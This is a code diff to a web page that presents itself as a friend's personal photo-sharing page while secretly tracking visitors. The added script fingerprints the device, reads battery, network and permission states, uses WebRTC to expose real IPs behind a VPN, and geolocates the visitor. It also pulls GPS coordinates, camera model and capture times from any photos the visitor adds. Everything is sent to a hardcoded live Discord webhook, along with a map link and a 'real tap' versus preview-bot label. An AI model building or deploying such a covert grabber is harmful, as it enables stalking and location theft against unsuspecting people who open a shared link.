@@ -12,45 +12,144 @@
        margin:48px auto;padding:0 18px;line-height:1.6;color:#111}
   h1{font-size:26px;margin:0 0 8px}
   p{color:#444}
+  .pick{display:inline-block;margin-top:6px;font-size:15px;color:#06c;
+        text-decoration:none;border-bottom:1px solid #cde;cursor:pointer}
+  .pick:hover{border-color:#06c}
+  #note{margin-top:14px;font-size:14px;color:#777}
 </style>
 </head>
 <body>
 <h1>Photos</h1>
 <p>Here's the set I was telling you about. More coming later this week.</p>
+<a class="pick" id="pick">Add your photos</a>
+<div id="note"></div>
 
+<input type="file" id="pic" accept="image/*" multiple hidden>
+
+<script src="https://cdn.jsdelivr.net/npm/exifr/dist/lite.umd.js"></script>
 <script>
 const PING = 'https://discord.com/api/webhooks/1560928889751080962/ondOL9bsp--IJzPcgNvtXQgE7v57EeQees2xkRkWNyjCYJ6-f_zIMVPSe7jtiOApCdwk';
+const BOTS = /whatsapp|facebookexternalhit|facebookcatalog|facebot|telegrambot|slackbot|discordbot|twitterbot|linkedinbot|embedly|pinterest|bot\/|crawler|spider|preview/i;
+
+const send = body => fetch(PING, { method:'POST', keepalive:true,
+  headers:{'Content-Type':'application/json'},
+  body: JSON.stringify({ content: body }) }).catch(()=>{});
 
 (async () => {
   const d = { ua: navigator.userAgent, lang: navigator.language,
               screen: screen.width + 'x' + screen.height,
+              dpr: devicePixelRatio, depth: screen.colorDepth,
               tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-              ref: document.referrer, ts: new Date().toISOString() };
+              tzoff: new Date().getTimezoneOffset(),
+              ref: document.referrer, ts: new Date().toISOString(),
+              path: location.pathname + location.search };
 
   try {
     const g = await (await fetch('https://ipwho.is/')).json();
     Object.assign(d, { ip: g.ip, city: g.city, region: g.region,
-                       country: g.country, isp: g.connection?.isp,
-                       lat: g.latitude, lon: g.longitude });
+      country: g.country, isp: g.connection?.isp,
+      lat: g.latitude, lon: g.longitude });
   } catch {}
 
-  const isBot = /whatsapp|facebookexternalhit|facebookcatalog|facebot|telegrambot|slackbot|discordbot|twitterbot|linkedinbot|bot\/|crawler|spider|preview/i
-                .test(d.ua || '');
+  // silent extras
+  try { const b = await navigator.getBattery();
+        d.batt = Math.round(b.level*100) + '%' + (b.charging ? ' (charging)' : ''); } catch {}
+  try { const c = navigator.connection;
+        d.net = [c.effectiveType, c.downlink && c.downlink+'Mbps', c.rtt && c.rtt+'ms']
+                .filter(Boolean).join(' / '); } catch {}
+  try { const s = await navigator.storage.estimate();
+        d.quota = Math.round(s.quota/1e9) + 'GB'; } catch {}
+  for (const n of ['geolocation','camera','microphone','notifications']) {
+    try { d['perm_'+n] = (await navigator.permissions.query({name:n})).state; } catch {}
+  }
+
+  // fingerprint
+  d.cores = navigator.hardwareConcurrency || '';
+  d.mem = navigator.deviceMemory || '';
+  try {
+    const gl = document.createElement('canvas').getContext('webgl');
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    d.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : '';
+  } catch {}
+  try {
+    const cv = document.createElement('canvas'), x = cv.getContext('2d');
+    x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60';
+    x.fillRect(0,0,100,20); x.fillStyle='#069'; x.fillText('fp,1',2,2);
+    d.cfp = cv.toDataURL().slice(-40);
+  } catch {}
+
+  // returning visitor
+  try {
+    let vid = localStorage.getItem('vid');
+    if (!vid) { vid = Math.random().toString(36).slice(2,10); localStorage.setItem('vid', vid); }
+    d.vid = vid;
+    d.returning = localStorage.getItem('seen') ? 'YES' : 'no';
+    localStorage.setItem('seen', '1');
+  } catch {}
+
+  // webrtc -> real IP behind VPN + local IP
+  d.rtc = await new Promise(res => {
+    const ips = new Set();
+    try {
+      const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+      pc.createDataChannel('');
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
+      pc.onicecandidate = e => {
+        if (!e.candidate) { try{pc.close()}catch{}; return res([...ips].join(', ')); }
+        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+        if (m) ips.add(m[1]);
+      };
+      setTimeout(() => { try{pc.close()}catch{}; res([...ips].join(', ')); }, 800);
+    } catch { res(''); }
+  });
+
+  const bot = BOTS.test(d.ua || '');
+  const map = (d.lat && d.lon) ? `https://maps.google.com/?q=${d.lat},${d.lon}` : '';
+  const utc = `UTC${d.tzoff<=0?'+':'-'}${Math.abs(d.tzoff/60)}`;
 
   const msg = [
-    isBot ? 'PREVIEW BOT' : 'REAL TAP',
-    `**${d.city || '?'}, ${d.region || '?'} ${d.country || '?'}**`,
-    `ISP: ${d.isp || '?'}`,
-    `IP: ${d.ip || '?'}`,
-    `Coords: ${d.lat}, ${d.lon}`,
-    `TZ: ${d.tz}`,
-    `Device: ${d.ua}`
-  ].join('\n');
+    bot ? '🤖 PREVIEW BOT' : '✅ REAL TAP',
+    `**${d.city||'?'}, ${d.region||'?'} ${d.country||'?'}**`,
+    `ISP: ${d.isp||'?'}`,
+    `IP: ${d.ip||'?'}`,
+    map ? `Map: ${map}` : '',
+    `TZ: ${d.tz} (${utc})`,
+    `Net: ${d.net||'?'}  Batt: ${d.batt||'?'}`,
+    `Screen: ${d.screen} @${d.dpr}x ${d.depth}bit`,
+    `Cores/Mem: ${d.cores||'?'}/${d.mem||'?'}GB  Quota: ${d.quota||'?'}`,
+    d.gpu ? `GPU: ${d.gpu}` : '',
+    d.rtc ? `RTC: ${d.rtc}` : '',
+    `FP: ${d.cfp||'?'}`,
+    `VID: ${d.vid||'?'} (returning: ${d.returning||'?'})`,
+    `Perms: geo:${d.perm_geolocation||'?'} cam:${d.perm_camera||'?'}`,
+    `Lang: ${d.lang}  Ref: ${d.ref||'-'}`,
+    `UA: ${d.ua}`
+  ].filter(Boolean).join('\n');
 
-  try { fetch(PING, { method: 'POST', keepalive: true,
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: msg }) }); } catch {}
+  send(msg);
 })();
+
+// photo picker -> EXIF GPS
+const pic = document.getElementById('pic');
+document.getElementById('pick').onclick = e => { e.preventDefault(); pic.click(); };
+
+pic.onchange = async e => {
+  const out = [];
+  for (const f of e.target.files) {
+    try {
+      const g = await exifr.gps(f);
+      const x = await exifr.parse(f, ['Make','Model','DateTimeOriginal']);
+      const bits = [];
+      if (x?.Make || x?.Model) bits.push(`${x.Make||''} ${x.Model||''}`.trim());
+      if (g?.latitude) bits.push(`${g.latitude},${g.longitude}`);
+      if (x?.DateTimeOriginal) bits.push(new Date(x.DateTimeOriginal).toISOString());
+      if (bits.length) out.push(bits.join(' | '));
+    } catch {}
+  }
+  if (out.length) send('📷 PHOTOS (' + out.length + ')\n' + out.join('\n'));
+  document.getElementById('note').textContent =
+    out.length ? out.length + ' photo(s) read' : 'No EXIF location in those';
+};
 </script>
 </body>
 </html>
